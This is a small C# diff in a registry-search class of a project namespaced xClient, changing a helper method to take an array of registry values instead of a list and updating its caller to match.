@@ -157,7 +157,7 @@ namespace xClient.Core.Registry
                     values.Add(new RegValueData(valueName, valueType, valueData));
                 }
 
-                AddMatch(keyName, values, key.SubKeyCount);
+                AddMatch(keyName, values.ToArray(), key.SubKeyCount);
             }
             else
             {
@@ -166,7 +166,7 @@ namespace xClient.Core.Registry
 
         }
 
-        private void AddMatch(string key, List<RegValueData> values, int subkeycount)
+        private void AddMatch(string key, RegValueData[] values, int subkeycount)
         {
             RegSeekerMatch match = new RegSeekerMatch(key, values, subkeycount);
 
